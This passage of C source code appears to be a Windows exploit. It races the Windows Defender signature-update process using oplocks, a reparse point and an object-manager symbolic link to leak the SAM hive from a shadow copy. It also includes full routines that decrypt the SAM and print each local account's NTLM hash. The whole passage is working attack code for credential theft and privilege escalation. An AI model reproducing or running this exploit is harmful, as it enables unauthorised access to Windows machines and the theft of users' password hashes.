		void* retval = UnprotectPasswordEncryptionKeyAES(data, (char*)lsaKey, keysz);
		free(data);
		return retval;
	}
	printf("Unsupported SAM encryption type: %d\n", enctype);
	return NULL;

}

// Decrypt an AES-protected SAM password hash blob.
void* UnprotectPasswordHashAES(char* key, int keysz, char* data, int datasz, int* outsz)
{
	int length = (unsigned char)data[4];
	if (!length)
		return NULL;
	if (datasz < 24)
		return NULL;
	char iv[16] = { 0 };
	memmove(iv, &data[8], sizeof(iv));

	int ciphertextsz = datasz - 24;
	if (ciphertextsz <= 0)
		return NULL;
	char* ciphertext = (char*)malloc(ciphertextsz);
	if (!ciphertext) return NULL;
	memmove(ciphertext, &data[8 + sizeof(iv)], ciphertextsz);
	void* result = UnprotectAES(key, iv, ciphertext, ciphertextsz, outsz);
	free(ciphertext);
	return result;
}

// Dispatch SAM password hash decryption based on the stored encryption type.
void* UnprotectPasswordHash(char* key, int keysz, char* data, int datasz, ULONG rid, int* outsz)
{
	int enctype = (unsigned char)data[2];

	switch (enctype)
	{
		case 2:
			return UnprotectPasswordHashAES(key, keysz, data, datasz, outsz);

		default:
			printf("Unsupported password hash encryption type: %d\n", enctype);
			break;
	}

	return NULL;


}

// Decrypt a DES block using a derived SAM RID key.
void* UnprotectDES(char* key, int keysz, char* ciphertext, int ciphertextsz, int* outsz)
{
	
	if (ciphertextsz <= 0) return NULL;
	char* ciphertext2 = (char*)malloc(ciphertextsz);
	if (!ciphertext2) return NULL;
	memmove(ciphertext2, ciphertext, ciphertextsz);
	HCRYPTPROV hprov = NULL;
	if (!CryptAcquireContext(&hprov, 0, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT) || !hprov)
	{
		free(ciphertext2);
		return NULL;
	}

	struct deskeyBlob
	{
		BLOBHEADER hdr;
		DWORD keySize;
		BYTE bytes[8];
	}blob;
	blob.hdr.bType = PLAINTEXTKEYBLOB;
	blob.hdr.bVersion = CUR_BLOB_VERSION;
	blob.hdr.reserved = 0;
	blob.hdr.aiKeyAlg = CALG_DES;
	blob.keySize = 8;
	memmove(blob.bytes, key, 8);
	HCRYPTKEY hcryptkey = NULL;
	if (!CryptImportKey(hprov, (const BYTE*)&blob, sizeof(deskeyBlob), NULL, NULL, &hcryptkey) || !hcryptkey)
	{
		CryptReleaseContext(hprov, 0);
		free(ciphertext2);
		return NULL;
	}

	DWORD mode = CRYPT_MODE_ECB;
	CryptSetKeyParam(hcryptkey, KP_MODE, (const BYTE*)&mode, NULL);

	DWORD retsz = ciphertextsz;
	CryptDecrypt(hcryptkey, NULL, TRUE, CRYPT_DECRYPT_RSA_NO_PADDING_CHECK, (BYTE*)ciphertext2, &retsz);

	if (outsz)
		*outsz = 8;

	CryptDestroyKey(hcryptkey);
	CryptReleaseContext(hprov, 0);
	return ciphertext2;
}

// Expand a seven-byte SAM RID key fragment into an eight-byte DES key.
char* DeriveDESKey(char data[7])
{
	enum { DES_INPUT_SIZE = 7, DES_OUTPUT_SIZE = 8 };

	union keyderv {
		struct {
			char arr[DES_OUTPUT_SIZE];
		};
		SIZE_T derv;
	};
	keyderv ttv = { 0 };
	ZeroMemory(ttv.arr, sizeof(ttv.arr));
	memmove(ttv.arr, data, DES_INPUT_SIZE);
	SIZE_T k = ttv.derv;


	char* key = (char*)malloc(DES_OUTPUT_SIZE);
	if (!key) return NULL;

	for (int i = 0; i < DES_OUTPUT_SIZE; i++)
	{
		int j = DES_INPUT_SIZE - i;
		int curr = (k >> (7 * j)) & 0x7F;
		int b = curr;
		b ^= b >> 4;
		b ^= b >> 2;
		b ^= b >> 1;
		int keybyte = (curr << 1) ^ (b & 1) ^ 1;
		key[i] = (char)keybyte;
	}
	return key;
}

// Decrypt both halves of an NT hash with RID-derived DES keys.
void* UnproctectPasswordHashDES(char* ciphertext, int ciphersz, int* outsz, ULONG rid)
{

	union keydata {
		struct {
			char a;
			char b;
			char c;
			char d;
		};
		ULONG data;
	};

	keydata keycontent = { 0 };
	keycontent.data = rid;
	char key1[7] = { keycontent.c,keycontent.b,keycontent.a,keycontent.d, keycontent.c, keycontent.b,keycontent.a };
	char key2[7] = { keycontent.b,keycontent.a,keycontent.d,keycontent.c, keycontent.b, keycontent.a,keycontent.d };

	char* rkey1 = DeriveDESKey(key1);
	char* rkey2 = DeriveDESKey(key2);
	if (!rkey1 || !rkey2)
	{
		free(rkey1);
		free(rkey2);
		return NULL;
	}

	int plaintext1sz = 0;
	int plaintext2sz = 0;
	char* plaintext1 = (char*)UnprotectDES(rkey1, sizeof(key1), ciphertext, ciphersz, &plaintext1sz);
	free(rkey1);
	rkey1 = NULL;
	if (!plaintext1)
	{
		free(rkey2);
		return NULL;
	}
	char* plaintext2 = (char*)UnprotectDES(rkey2, sizeof(key2), &ciphertext[8], ciphersz, &plaintext2sz);
	free(rkey2);
	rkey2 = NULL;
	if (!plaintext2)
	{
		free(plaintext1);
		return NULL;
	}
	void* retval = malloc(plaintext1sz + plaintext2sz);
	if (retval)
	{
		memmove(retval, plaintext1, plaintext1sz);
		memmove(RtlOffsetToPointer(retval, plaintext1sz), plaintext2, plaintext2sz);
	}
	free(plaintext1);
	free(plaintext2);
	if (outsz)
		*outsz = plaintext1sz + plaintext2sz;
	return retval;
}

// Decrypt a SAM NT hash through the AES and DES protection layers.
void* UnprotectNTHash(char* key, int keysz, char* encryptedHash, int enchashsz, int* outsz, ULONG rid)
{
	int _outsz = 0;
	void* dec = UnprotectPasswordHash(key, keysz, encryptedHash, enchashsz, rid, &_outsz);
	if (!dec)
		return NULL;
	int _hashoutsz = 0;
	void* _hash = UnproctectPasswordHashDES((char*)dec, _outsz, &_hashoutsz, rid);
	free(dec);
	if (outsz)
		*outsz = _hashoutsz;
	return _hash;
}

// Format binary data as a lowercase hexadecimal string.
unsigned char* HexToHexString(unsigned char* data, int size)
{
	unsigned char* retval = (unsigned char*)malloc(size * 2 + 1);
	if (!retval) return NULL;
	ZeroMemory(retval, size * 2 + 1);
	for (int i = 0; i < size; i++)
	{
		sprintf((char*)&retval[i * 2], "%02x", data[i]);
	}

	return retval;
}

#define SAM_DATABASE_DATA_ACCESS_OFFSET 0xcc
#define SAM_DATABASE_USERNAME_OFFSET 0x0c
#define SAM_DATABASE_USERNAME_LENGTH_OFFSET 0x10
#define SAM_DATABASE_LM_HASH_OFFSET 0x9c
#define SAM_DATABASE_LM_HASH_LENGTH_OFFSET 0xa0
#define SAM_DATABASE_NT_HASH_OFFSET 0xa8
#define SAM_DATABASE_NT_HASH_LENGTH_OFFSET 0xac

struct PwdEnc
{
	char* buff;
	size_t sz;
	wchar_t* username;
	ULONG usernamesz;
	char* LMHash;
	ULONG LMHashLenght;
	char* NTHash;
	ULONG NTHashLenght;
	ULONG rid;

};

// Open an offline SAM hive and print decrypted local account NT hashes.
bool DumpSAMHashes(wchar_t* sampath)
{
	if (!initializeAPIs() || !OROpenHive || !OROpenKey || !ORGetValue || !ORCloseKey || !ORQueryInfoKey || !OREnumKey || !ORCloseHive) {
		printf("Missing Offline Registry API support (offreg.dll).\n");
		return false;
	}
	ORHKEY hSAMhive = NULL;
	DWORD err = OROpenHive(sampath, &hSAMhive);
	if (err) { printf("OROpenHive failed: %d\n", err); return false; }

	unsigned char lsakey[16] = { 0 };
	if (!GetLSASecretKey(lsakey)) {
		printf("Failed to dump LSA secret keys.\n");
		ORCloseHive(hSAMhive);
		return false;
	}

	ORHKEY hkey = NULL;
	err = OROpenKey(hSAMhive, L"SAM\\Domains\\Account", &hkey);
	if (err || !hkey) {
		printf("OROpenKey(Account) failed: %d\n", err);
		ORCloseHive(hSAMhive);
		return false;
	}
	DWORD valuesz = 0;
	err = ORGetValue(hkey, NULL, L"F", NULL, NULL, &valuesz);
	if (err) {
		printf("ORGetValue(F) failed: %d\n", err);
		ORCloseKey(hkey);
		ORCloseHive(hSAMhive);
		return false;
	}
	char* samkey = (char*)malloc(valuesz);
	if (!samkey) {
		ORCloseKey(hkey);
		ORCloseHive(hSAMhive);
		return false;
	}
	ORGetValue(hkey, NULL, L"F", NULL, samkey, &valuesz);
	ORCloseKey(hkey);
	hkey = NULL;

	int passwordEncryptionKeysz = 0;
	char* passwordEncryptionKey = (char*)UnprotectPasswordEncryptionKey(samkey, lsakey, &passwordEncryptionKeysz);
	free(samkey);
	samkey = NULL;

	if (!passwordEncryptionKey) {
		printf("Failed to decrypt password encryption key.\n");
		ORCloseHive(hSAMhive);
		return false;
	}

	err = OROpenKey(hSAMhive, L"SAM\\Domains\\Account\\Users", &hkey);
	if (err) {
		printf("OROpenKey(Users) failed: %d\n", err);
		free(passwordEncryptionKey);
		ORCloseHive(hSAMhive);
		return false;
	}

	DWORD subkeys = 0;
	ORQueryInfoKey(hkey, NULL, NULL, &subkeys, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

	bool retval = true;
	PwdEnc** pwdenclist = subkeys ? (PwdEnc**)malloc(sizeof(PwdEnc*) * subkeys) : NULL;
	const size_t kOutputBufSz = 0x20000;
	char* outputbuf = (char*)malloc(kOutputBufSz);
	size_t outputused = 0;
	int numofentries = 0;
	if (!outputbuf || (subkeys && !pwdenclist)) {
		printf("Failed to allocate output/list buffer.\n");
		free(outputbuf);
		free(pwdenclist);
		free(passwordEncryptionKey);
		ORCloseKey(hkey);
		ORCloseHive(hSAMhive);
		return false;
	}
	ZeroMemory(outputbuf, kOutputBufSz);
	for (int i = 0; i < (int)subkeys; i++)
	{
		DWORD keynamesz = 0x100;
		wchar_t keyname[0x100] = { 0 };
		if (OREnumKey(hkey, i, keyname, &keynamesz, NULL, NULL, NULL)) continue;
		if (_wcsicmp(keyname, L"users") == 0) continue;
		ORHKEY hkey2 = NULL;
		if (OROpenKey(hkey, keyname, &hkey2)) continue;
		DWORD vsz = 0;
		err = ORGetValue(hkey2, NULL, L"V", NULL, NULL, &vsz);
		if (err == ERROR_FILE_NOT_FOUND) { ORCloseKey(hkey2); continue; }
		if (err != ERROR_MORE_DATA && err != ERROR_SUCCESS) { ORCloseKey(hkey2); continue; }
		PwdEnc* SAMpwd = (PwdEnc*)malloc(sizeof(PwdEnc));
		if (!SAMpwd) { ORCloseKey(hkey2); continue; }
		ZeroMemory(SAMpwd, sizeof(PwdEnc));
		SAMpwd->sz = vsz;
		SAMpwd->buff = (char*)malloc(vsz);
		if (!SAMpwd->buff) { free(SAMpwd); ORCloseKey(hkey2); continue; }
		ZeroMemory(SAMpwd->buff, vsz);
		if (ORGetValue(hkey2, NULL, L"V", NULL, SAMpwd->buff, &vsz)) {
			free(SAMpwd->buff); free(SAMpwd); ORCloseKey(hkey2); continue;
		}
		ORCloseKey(hkey2);
		SAMpwd->rid = wcstoul(keyname, NULL, 16);
		ULONG* accnameoffset = (ULONG*)&SAMpwd->buff[SAM_DATABASE_USERNAME_OFFSET];
		SAMpwd->username = (wchar_t*)RtlOffsetToPointer(SAMpwd->buff, *accnameoffset + SAM_DATABASE_DATA_ACCESS_OFFSET);
		SAMpwd->usernamesz = *(ULONG*)&SAMpwd->buff[SAM_DATABASE_USERNAME_LENGTH_OFFSET];
		ULONG* LMhashoffset = (ULONG*)&SAMpwd->buff[SAM_DATABASE_LM_HASH_OFFSET];
		SAMpwd->LMHash = (char*)RtlOffsetToPointer(SAMpwd->buff, *LMhashoffset + SAM_DATABASE_DATA_ACCESS_OFFSET);
		SAMpwd->LMHashLenght = *(ULONG*)&SAMpwd->buff[SAM_DATABASE_LM_HASH_LENGTH_OFFSET];
		ULONG* NTHashoffset = (ULONG*)&SAMpwd->buff[SAM_DATABASE_NT_HASH_OFFSET];
		SAMpwd->NTHash = (char*)RtlOffsetToPointer(SAMpwd->buff, *NTHashoffset + SAM_DATABASE_DATA_ACCESS_OFFSET);
		SAMpwd->NTHashLenght = *(ULONG*)&SAMpwd->buff[SAM_DATABASE_NT_HASH_LENGTH_OFFSET];
		pwdenclist[numofentries++] = SAMpwd;
	}
	ORCloseKey(hkey);
	hkey = NULL;

	for (int i = 0; i < numofentries; i++)
	{
		PwdEnc* samentry = pwdenclist[i];
		int realNTLMHashsz = 0;
		char* realNTLMHash = (char*)UnprotectNTHash(passwordEncryptionKey, passwordEncryptionKeysz, samentry->NTHash, samentry->NTHashLenght, &realNTLMHashsz, samentry->rid);
		char emptyrepresentation[] = "{NULL}";
		char* stringntlm = (realNTLMHashsz && realNTLMHash) ? (char*)HexToHexString((unsigned char*)realNTLMHash, realNTLMHashsz) : NULL;
		free(realNTLMHash);
		wchar_t username[UNLEN + 1] = { 0 };
		if (samentry->usernamesz <= sizeof(username) - sizeof(wchar_t))
			memmove(username, samentry->username, samentry->usernamesz);

		char lineentry[512] = { 0 };
		int linesz = sprintf(lineentry,
			"******************************************\n    User : %ws\n    RID : %lu\n    NTLM : %s\n",
			username, samentry->rid, stringntlm ? stringntlm : emptyrepresentation);
		if (stringntlm) { free(stringntlm); stringntlm = NULL; }
		if (linesz > 0 && outputused + (size_t)linesz + 1 < kOutputBufSz)
		{
			memmove(outputbuf + outputused, lineentry, linesz);
			outputused += linesz;
		}
	}

	const char footer[] = "******************************************\n";
	if (outputused + sizeof(footer) < kOutputBufSz)
	{
		memmove(outputbuf + outputused, footer, sizeof(footer) - 1);
		outputused += sizeof(footer) - 1;
		outputbuf[outputused] = '\0';
	}
	printf("%s", outputbuf);

	for (int i = 0; i < numofentries; i++)
	{
		if (pwdenclist[i])
		{
			free(pwdenclist[i]->buff);
			free(pwdenclist[i]);
		}
	}
	free(pwdenclist);
	free(outputbuf);
	free(passwordEncryptionKey);
	ORCloseHive(hSAMhive);
	return retval;
}

// Check whether the current process token belongs to LocalSystem.
bool IsRunningAsLocalSystem()
{
	

	HANDLE htoken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htoken)) {
		printf("OpenProcessToken failed, error : %d\n", GetLastError());
		return false;
	}
	TOKEN_USER* tokenuser = (TOKEN_USER*)malloc(MAX_SID_SIZE + sizeof(TOKEN_USER));
	DWORD retsz = 0;
	bool res = GetTokenInformation(htoken, TokenUser, tokenuser, MAX_SID_SIZE + sizeof(TOKEN_USER), &retsz);
	CloseHandle(htoken);
	if (!res)
		return false;

	return IsWellKnownSid(tokenuser->User.Sid, WinLocalSystemSid);
}

// Drive the Defender update race, leak the SAM hive, and dump hashes.
static int RunMain(const wchar_t* leak_file_arg)
{
	if (!initializeAPIs()) {
		printf("Failed to resolve delayed imports.\n");
		return 1;
	}

	if (IsRunningAsLocalSystem())
	{
		printf("Running as local system.\n");
		return 0;
	}

	const wchar_t* customLeakFile = (leak_file_arg && leak_file_arg[0]) ? leak_file_arg : L"\\Windows\\System32\\Config\\SAM";
	const wchar_t* filestoleak[] = { customLeakFile };
	wchar_t fullvsspath[MAX_PATH] = { 0 };
	HANDLE hreleaseready = NULL;
	wchar_t updtitle[0x200] = { 0 };
	wchar_t nttargetfile[MAX_PATH] = { 0 };

	GUID uid = { 0 };
	RPC_WSTR wuid = { 0 };
	wchar_t* wuid2 = 0;
	wchar_t envstr[MAX_PATH] = { 0 };
	wchar_t updatepath[MAX_PATH] = { 0 };
	DWORD tid = 0;
	HANDLE hthread = NULL;
	WDRPCWorkerThreadArgs threadargs = { 0 };
	HANDLE hcurrentthread = NULL;
	HANDLE hdir = NULL;
	wchar_t newdefupdatedirname[MAX_PATH] = { 0 };
	wchar_t updatelibpath[MAX_PATH] = { 0 };
	UNICODE_STRING unistrupdatelibpath = { 0 };
	OBJECT_ATTRIBUTES objattr = { 0 };
	IO_STATUS_BLOCK iostat = { 0 };
	HANDLE hupdatefile = NULL;
	NTSTATUS ntstat = 0;
	OVERLAPPED ovd = { 0 };
	wchar_t newname[MAX_PATH] = { 0 };
	DWORD renstructsz = 0;
	UNICODE_STRING objlinkname = { 0 };
	UNICODE_STRING objlinktarget = { 0 };
	FILE_RENAME_INFO* fri = 0;
	wchar_t wreparsedirpath[MAX_PATH] = { 0 };
	UNICODE_STRING reparsedirpath = { 0 };
	HANDLE hreparsedir = NULL;
	wchar_t newtmp[MAX_PATH] = { 0 };
	wchar_t copiedfilepath[MAX_PATH] = { 0 };
	wchar_t rptarget[MAX_PATH] = { 0 };
	wchar_t printname[1] = { L'\0' };
	size_t targetsz = 0;
	size_t printnamesz = 0;
	size_t pathbuffersz = 0;
	size_t totalsz = 0;
	REPARSE_DATA_BUFFER* rdb = 0;
	OVERLAPPED ov = { 0 };
	DWORD retsz = 0;
	HANDLE hleakedfile = NULL;
	HANDLE hobjlink = NULL;
	LARGE_INTEGER _filesz = { 0 };
	OVERLAPPED ovd2 = { 0 };
	DWORD __readsz = 0;
	void* leakedfilebuff = 0;
	bool filelocked = false;
	bool dirmoved = false;
	bool needupdatedircleanup = false;
	UpdateFiles* UpdateFilesList = NULL;
	UpdateFiles* UpdateFilesListCurrent = NULL;
	bool isvssready = false;
	bool criterr = false;

	
	printf("[1/6] Checking for WD signature update...\n");
	while (!CheckForWDUpdates(updtitle, &criterr)){
		if (criterr)
			goto cleanup;
		Sleep(30000);
	}
	printf("[1/6] Update found: %ws\n", updtitle);

		
		UpdateFilesList = GetUpdateFiles(NULL);
		if (!UpdateFilesList)
		{
			goto cleanup;
		}
		printf("[2/6] Update payload downloaded.\n");

		
		hreleaseready = CreateEvent(NULL, FALSE, FALSE, NULL);
		if (!hreleaseready)
		{
			printf("Failed to create event error : %d\n", GetLastError());
			goto cleanup;
		}
			

		
		isvssready = TriggerWDForVS(hreleaseready, fullvsspath);
		if (!isvssready)
			goto cleanup;

		
		for (int x = 0; x < sizeof(filestoleak) / sizeof(wchar_t*); x++)
		{
			UpdateFilesListCurrent = UpdateFilesList;
			UuidCreate(&uid);
			if (UuidToStringW(&uid, &wuid) != RPC_S_OK) {
				printf("Failed to convert UUID to string\n");
				goto cleanup;
			}
			wuid2 = (wchar_t*)wuid;
			wcscpy(envstr, L"%TEMP%\\");
			wcscat(envstr, wuid2);
			ExpandEnvironmentStrings(envstr, updatepath, MAX_PATH);
			RpcStringFreeW(&wuid);
			wuid = NULL;
			needupdatedircleanup = CreateDirectory(updatepath, NULL);
			if (!needupdatedircleanup)
			{
				printf("Failed to create update directory, error : %d", GetLastError());
				goto cleanup;
			}
			while (UpdateFilesListCurrent)
			{
				wchar_t filepath[MAX_PATH] = { 0 };
				wcscpy(filepath, updatepath);
				wcscat(filepath, L"\\");
				size_t remaining = MAX_PATH - wcslen(filepath);
				MultiByteToWideChar(CP_ACP, NULL, UpdateFilesListCurrent->filename, -1, &filepath[wcslen(filepath)], remaining);


				HANDLE hupdate = CreateFile(filepath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, NULL, NULL);

				if (!hupdate || hupdate == INVALID_HANDLE_VALUE)
				{
					printf("Failed to create update file, error : %d", GetLastError());
					goto cleanup;
				}
				UpdateFilesListCurrent->filecreated = true;
				DWORD writtenbytes = 0;
				if (!WriteFile(hupdate, UpdateFilesListCurrent->filebuff, UpdateFilesListCurrent->filesz, &writtenbytes, NULL))
				{
					printf("Failed to write update file, error : %d", GetLastError());
					CloseHandle(hupdate);
					goto cleanup;
				}
				CloseHandle(hupdate);
				UpdateFilesListCurrent = UpdateFilesListCurrent->next;

			}

			
			
			
			wcscpy(updatelibpath, L"\\??\\");
			wcscat(updatelibpath, updatepath);
			wcscat(updatelibpath, L"\\mpasbase.vdm");

			RtlInitUnicodeString(&unistrupdatelibpath, updatelibpath);
			InitializeObjectAttributes(&objattr, &unistrupdatelibpath, OBJ_CASE_INSENSITIVE, NULL, NULL);

			ntstat = NtCreateFile(&hupdatefile, GENERIC_READ | DELETE | SYNCHRONIZE, &objattr, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, NULL, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_DELETE_ON_CLOSE, NULL, NULL);
			if (ntstat)
			{
				printf("Failed to open update library (pre-RPC), ntstatus : 0x%0.8X", ntstat);
				goto cleanup;
			}

			ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
			DeviceIoControl(hupdatefile, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL, &ovd);
			if (GetLastError() != ERROR_IO_PENDING)
			{
				printf("Failed to request batch oplock, error : %d", GetLastError());
				goto cleanup;
			}

			
			hdir = CreateFile(L"C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED, NULL);
			if (!hdir || hdir == INVALID_HANDLE_VALUE)
			{
				printf("Failed to open definition updates directory, error : %d", GetLastError());
				goto cleanup;
			}

			hcurrentthread = OpenThread(THREAD_ALL_ACCESS, NULL, GetCurrentThreadId());
			if (!hcurrentthread)
			{
				printf("Unexpected error while opening current thread, error : %d", GetLastError());
				goto cleanup;
			}
			wcscpy(threadargs.dirpath, updatepath);
			threadargs.hntfythread = hcurrentthread;
			threadargs.hevent = CreateEvent(NULL, FALSE, FALSE, NULL);
			threadargs.res = RPC_S_OK;
			threadargs.errstat = 0;
			threadargs.errstat0 = 0;
			threadargs.errstat1 = 0;
			threadargs.versionMatch = false;
			threadargs.workerTid = 0;
			threadargs.workerExitCode = STILL_ACTIVE;
			threadargs.stage = -1;
			threadargs.composeStatus = RPC_S_OK;
			threadargs.bindStatus = RPC_S_OK;
			threadargs.rpcStatus0 = RPC_S_OK;
			threadargs.rpcStatus1 = RPC_S_OK;
			if (!updatepath[0]) {
				goto cleanup;
			}
			if (!threadargs.hevent) {
				printf("Failed to create event for thread, error : %d", GetLastError());
				goto cleanup;
			}
			hthread = CreateThread(NULL, NULL, WDCallerThread, (LPVOID)&threadargs, NULL, &tid);
			if (!hthread) {
				printf("Failed to create thread, error : %d", GetLastError());
				goto cleanup;
			}

			
			wcscpy(newdefupdatedirname, L"C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\");
			{
				HANDLE oplockEvents[2] = { ovd.hEvent, threadargs.hevent };
				DWORD oplockWres = WaitForMultipleObjects(2, oplockEvents, FALSE, 60000);
				if (oplockWres != WAIT_OBJECT_0) {
					if (threadargs.res == 0x8050A003) {
						printf("ServerMpUpdateEngineSignature rejected the update (0x8050A003).\n");
						if (threadargs.versionMatch) {
							printf("The downloaded engine matches the installed version. Wait for a newer KB2267602 and retry.\n");
						} else {
							printf("No oplock fired. Ensure Defender has a newer signature update available and try again.\n");
						}
					} else {
						printf("Proc42 ended before oplock fired, RPC_STATUS : 0x%0.8X\n", threadargs.res);
					}
					goto cleanup;
				}
			}
			printf("[5/6] TOCTOU race won, swapping directory...\n");

			
			{
				BYTE dirbuff[4096] = { 0 };
				OVERLAPPED dod = { 0 };
				dod.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
				DWORD retb = 0;
				ReadDirectoryChangesW(hdir, dirbuff, sizeof(dirbuff), FALSE, FILE_NOTIFY_CHANGE_DIR_NAME, &retb, &dod, NULL);
				if (WaitForSingleObject(dod.hEvent, 3000) == WAIT_OBJECT_0) {
					PFILE_NOTIFY_INFORMATION pfni = (PFILE_NOTIFY_INFORMATION)dirbuff;
					if (pfni->Action == FILE_ACTION_ADDED) {
						size_t baseLen = wcslen(newdefupdatedirname);
						size_t nameLen = pfni->FileNameLength / sizeof(WCHAR);
						if (baseLen + nameLen < MAX_PATH - 1) {
							wcsncpy(&newdefupdatedirname[baseLen], pfni->FileName, nameLen);
							newdefupdatedirname[baseLen + nameLen] = L'\0';
							}
					}
				}
				if (dod.hEvent) CloseHandle(dod.hEvent);
			}

			

			wcscpy(newname, updatepath);
			wcscat(newname, L".WDFOO");
			renstructsz = sizeof(FILE_RENAME_INFO) + wcslen(newname) * sizeof(wchar_t) + sizeof(wchar_t);
			fri = (FILE_RENAME_INFO*)malloc(renstructsz);
			ZeroMemory(fri, renstructsz);
			fri->ReplaceIfExists = TRUE;
			fri->FileNameLength = wcslen(newname) * sizeof(wchar_t);
			wcscpy(&fri->FileName[0], newname);
			if (!SetFileInformationByHandle(hupdatefile, FileRenameInfo, fri, renstructsz))
			{
				printf("Failed to move file from %ws to %ws error : %d", updatelibpath, newname, GetLastError());
				goto cleanup;
			}
			free(fri);
			fri = NULL;
			


			wcscpy(newtmp, updatepath);
			wcscat(newtmp, L".foo");
			if (!MoveFile(updatepath, newtmp))
			{
				printf("Failed to move %ws to %ws, error : %d", updatepath, newtmp, GetLastError());
				goto cleanup;
			}
			dirmoved = true;

			wcscpy(wreparsedirpath, L"\\??\\");
			wcscat(wreparsedirpath, updatepath);

			RtlInitUnicodeString(&reparsedirpath, wreparsedirpath);
			InitializeObjectAttributes(&objattr, &reparsedirpath, OBJ_CASE_INSENSITIVE, NULL, NULL);

			ntstat = NtCreateFile(&hreparsedir, GENERIC_WRITE | DELETE | SYNCHRONIZE, &objattr, &iostat, NULL, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_CREATE, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT | FILE_DELETE_ON_CLOSE, NULL, NULL);
			if (ntstat)
			{
				printf("Failed to recreate update directory, error : 0x%0.8X", ntstat);
				goto cleanup;
			}


			wcscpy(rptarget, L"\\BaseNamedObjects\\Restricted");
			targetsz = wcslen(rptarget) * 2;
			printnamesz = 1 * 2;
			pathbuffersz = targetsz + printnamesz + 12;
			totalsz = pathbuffersz + REPARSE_DATA_BUFFER_HEADER_LENGTH;
			rdb = (REPARSE_DATA_BUFFER*)HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY, totalsz);
			rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
			rdb->ReparseDataLength = (USHORT)pathbuffersz;
			rdb->Reserved = NULL;
			rdb->MountPointReparseBuffer.SubstituteNameOffset = NULL;
			rdb->MountPointReparseBuffer.SubstituteNameLength = (USHORT)targetsz;
			memcpy(rdb->MountPointReparseBuffer.PathBuffer, rptarget, targetsz + 2);
			rdb->MountPointReparseBuffer.PrintNameOffset = (USHORT)(targetsz + 2);
			rdb->MountPointReparseBuffer.PrintNameLength = (USHORT)printnamesz;
			memcpy(rdb->MountPointReparseBuffer.PathBuffer + targetsz / 2 + 1, printname, printnamesz);

			ov.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
			if (!ov.hEvent)
			{
				printf("Failed to create event, error : %d", GetLastError());
				goto cleanup;
			}
			DeviceIoControl(hreparsedir, FSCTL_SET_REPARSE_POINT, rdb, totalsz, NULL, NULL, NULL, &ov);
			if (GetLastError() == ERROR_IO_PENDING) {
				GetOverlappedResult(hreparsedir, &ov, &retsz, TRUE);
			}
			HeapFree(GetProcessHeap(), NULL, rdb);
			rdb = NULL;
			if (GetLastError() != ERROR_SUCCESS)
			{
				printf("Failed to create reparse point, error : %d", GetLastError());
				goto cleanup;
			}

			ZeroMemory(nttargetfile, sizeof(nttargetfile));
			wcscpy(nttargetfile, fullvsspath);
			wcscat(nttargetfile, filestoleak[x]);

			RtlInitUnicodeString(&objlinkname, L"\\BaseNamedObjects\\Restricted\\mpasbase.vdm");
			RtlInitUnicodeString(&objlinktarget, nttargetfile);
			InitializeObjectAttributes(&objattr, &objlinkname, OBJ_CASE_INSENSITIVE, NULL, NULL);

			ntstat = _NtCreateSymbolicLinkObject(&hobjlink, GENERIC_ALL, &objattr, &objlinktarget);
			if (ntstat)
			{
				printf("Failed to create object manager symbolic link, error : %d", GetLastError());
				goto cleanup;
			}

			CloseHandle(ov.hEvent);
			ov.hEvent = NULL;
			CloseHandle(ovd.hEvent);
			ovd.hEvent = NULL;
			CloseHandle(hupdatefile);
			hupdatefile = NULL;


			
			
			
			
			
			{
				UNICODE_STRING objpath;
				OBJECT_ATTRIBUTES oa;
				IO_STATUS_BLOCK isb;
				RtlInitUnicodeString(&objpath, L"\\BaseNamedObjects\\Restricted\\mpasbase.vdm");
				InitializeObjectAttributes(&oa, &objpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
				NTSTATUS ns = NtCreateFile(&hleakedfile,
					GENERIC_READ | SYNCHRONIZE, &oa, &isb,
					NULL, FILE_ATTRIBUTE_NORMAL,
					FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
					FILE_OPEN,
					FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
					NULL, 0);
				if (ns || !hleakedfile || hleakedfile == INVALID_HANDLE_VALUE) {
					
					wcscat(newdefupdatedirname, L"\\mpasbase.vdm");
					hleakedfile = CreateFile(newdefupdatedirname, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
					if (!hleakedfile || hleakedfile == INVALID_HANDLE_VALUE) {
						printf("Failed to open leaked file via objlink (0x%08X) or defupdate path\n", ns);
						goto cleanup;
					}
				}
			}


			CloseHandle(hdir);
			hdir = NULL;
			CloseHandle(hreparsedir);
			hreparsedir = NULL;
			CloseHandle(hobjlink);
			hobjlink = NULL;

			GetFileSizeEx(hleakedfile, &_filesz);
			LockFileEx(hleakedfile, LOCKFILE_EXCLUSIVE_LOCK, NULL, _filesz.LowPart, _filesz.HighPart, &ovd2);
			filelocked = true;
			leakedfilebuff = malloc(_filesz.QuadPart);
			if (!leakedfilebuff)
			{
				printf("Failed to allocate enough memory to copy leaked file !!!");
				goto cleanup;
			}

			if (!ReadFile(hleakedfile, leakedfilebuff, _filesz.QuadPart, &__readsz, NULL))
			{
				printf("Failed to read file, error : %d\n", GetLastError());
				goto cleanup;
			}

